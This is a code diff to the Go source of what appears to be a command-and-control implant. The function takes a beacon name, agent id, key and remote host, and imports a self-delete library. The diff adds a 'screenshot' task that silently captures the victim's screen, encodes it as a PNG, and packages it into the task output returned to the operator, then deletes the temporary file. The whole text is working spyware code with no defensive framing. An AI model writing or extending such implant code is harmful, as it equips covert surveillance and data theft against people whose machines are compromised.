@@ -6,13 +6,16 @@ import (
 	"dingo/tasks"
 	"encoding/json"
 	"fmt"
+	"image/png"
 	"net/http"
 	"os"
 	"path"
 	"strings"
+	"time"
 
 	hg "github.com/deranged0tter/hellsgopher"
 	selfdelete "github.com/secur30nly/go-self-delete"
+	"github.com/vova616/screenshot"
 )
 
 func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string, key []byte, beacon_name string, rhost string, url string) {
@@ -63,6 +66,37 @@ func ExecTasks(tasksToDo []string, sleep *int, agentid string, useragent string,
 			data += " //END NAME// "
 			fileData, _ := hg.ReadFileToString(taskData)
 			data += fileData
+		case "screenshot":
+			img, err := screenshot.CaptureScreen()
+			if err != nil {
+				data = err.Error()
+				break
+			}
+
+			file, err := os.Create("./temp.png")
+			if err != nil {
+				data = err.Error()
+				break
+			}
+
+			err = png.Encode(file, img)
+			if err != nil {
+				data = err.Error()
+				hg.DeleteFile("./temp.png")
+				break
+			}
+
+			filename := "ss_" + fmt.Sprintf("%d", time.Now().Unix()) + ".png"
+			data = fmt.Sprintf("screenshot saved as (%s)", filename)
+			data += " //SPLIT// "
+			data += filename
+			data += " //END NAME// "
+			fileData, _ := hg.ReadFileToString("./temp.png")
+			data += fileData
+
+			hg.DeleteFile("./temp.png")
+		default:
+			data = "command not supported"
 		}
 
 		if !strings.Contains(data, " //SPLIT// ") {
